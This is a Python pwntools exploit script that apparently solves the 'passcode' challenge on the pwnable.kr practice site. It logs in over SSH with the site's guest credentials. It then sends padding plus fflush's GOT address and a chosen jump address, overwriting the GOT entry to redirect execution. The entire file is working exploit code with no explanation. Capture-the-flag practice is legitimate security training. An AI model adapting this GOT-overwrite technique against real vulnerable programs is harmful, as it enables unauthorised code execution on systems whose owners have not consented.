#!/usr/bin/env python3

from pwn import *

exe = ELF("./passcode")

context.binary = exe

def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path])
        # r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        host = 'pwnable.kr'
        port = 2222
        user = 'passcode'
        password = 'guest'
        conn = ssh(user, host, password=password, port=port)
        r = conn.process('./passcode')

    return r


def main():
    r = conn()

    r.sendlineafter(b'beta.', b'A'*96 + p32(exe.got.fflush))
    r.sendlineafter(b'!', str(0x080485e3).encode())

    r.interactive()


if __name__ == "__main__":
    main()